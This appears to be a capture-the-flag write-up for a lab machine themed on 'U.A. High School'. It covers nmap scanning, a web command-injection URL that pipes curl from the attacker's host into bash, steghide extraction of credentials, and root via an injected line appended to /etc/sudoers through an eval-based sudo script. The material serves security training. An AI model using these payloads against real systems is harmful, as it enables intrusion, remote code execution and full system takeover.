## nmap
```
➜  U.A.HighSchool git:(main) ✗ nmap -sCV -vv -oN scan.txt 10.10.234.137

...SNIP...
Scanning 10.10.234.137 [1000 ports]
Discovered open port 22/tcp on 10.10.234.137
Discovered open port 80/tcp on 10.10.234.137
```

## Revshell
```
http://10.10.234.137/assets/index.php?cmd=curl%2010.9.0.127:8000/x|bash
```

## passwd
```
www-data@myheroacademia:/var/www$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
...SNIP...
deku:x:1000:1000:deku:/home/deku:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
```

## Forensics
```
- Fix file signature from PNG to JPEG

www-data $ cat /var/www/Hidden_Content/passphrase.txt  | base64 -d
AllmightForEver!!!

╭─nutthanon@ubuntu ~/playground
╰─$ steghide extract -sf oneforall.jpg
Enter passphrase: AllmightForEver!!!
wrote extracted data to "creds.txt".
╭─nutthanon@ubuntu ~/playground
╰─$ ls
creds.txt  oneforall.jpg  revshell.war  RsaCtfTool  solve.py  x
╭─nutthanon@ubuntu ~/playground
╰─$ cat creds.txt
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

## Deku
`deku:One?For?All_!!one1/A`

```
deku@myheroacademia:~$ cat user.txt
THM{SNIP}
```

## root
User Deku has privilege to run sudo follow path `/opt/NewComponent/feedback.sh`
```
deku@myheroacademia:/tmp$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

But this file have many fiter to protect command injection but look at the power of `echo` command
```
deku@myheroacademia:/tmp$ cat /opt/NewComponent/feedback.sh
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input."
fi
```

The linux `echo` command will display the content inside of a string or quote, but in Linux we can create a new file or add a new line to the file by using `>` or `>>` in order.

Look at filter again; they do not filter `>` that means it can be create a new file or add a new line using root privilege. 

That means if I add a new line in `/etc/sudoers` with `deku ALL=/bin/bash` and when I run `sudo -l` again, It's supposed to see the user `deku`  can run the `sudo /bin/bash` and gain access to root shell.

The payload  is `"deku ALL=/bin/bash" >> /etc/sudoers`

```
deku@myheroacademia:/tmp$ sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form
This is a way to report various problems
    Developed by
        The Technical Department of U.A.
Enter your feedback:
"deku ALL=/bin/bash" >> /etc/sudoers
It is This:
Feedback successfully saved.

deku@myheroacademia:/tmp$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
    (root) /bin/bash
    
deku@myheroacademia:/tmp$ sudo /bin/bash
root@myheroacademia:/tmp# id
uid=0(root) gid=0(root) groups=0(root
```

## Roooooooooooot
```
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/

THM{SNIP}
```